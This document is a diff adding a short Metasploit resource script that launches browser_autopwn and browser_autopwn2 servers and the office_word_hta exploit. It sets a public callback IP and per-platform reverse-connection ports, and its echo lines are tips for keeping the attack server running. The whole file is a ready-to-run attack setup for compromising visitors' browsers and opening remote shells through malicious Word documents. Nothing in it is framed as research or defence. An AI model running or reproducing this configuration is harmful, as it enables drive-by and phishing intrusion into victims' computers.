@@ -1,0 +1,21 @@
+use auxiliary/server/browser_autopwn
+set lhost 54.183.166.71
+set lport_win32 10002
+set lport_linux 10003
+set lport_macos 10004
+set lport_generic 10005
+set lport_android 10006
+set lport_java 10007
+set srvport 7070
+run -j -z
+use auxiliary/server/browser_autopwn2
+echo make sure to change the local 172 IP to the 54.183.166.71 public IP
+setg LHOST 54.183.166.71
+run -j -z
+echo It is advisable to host this command FROM THE HOME PC because if you close out your SSH then the serve shuts down and needs to be restarted
+use exploit/windows/fileformat/office_word_hta
+options 
+set srvport 6060
+advanced 
+set lport 11000
+run
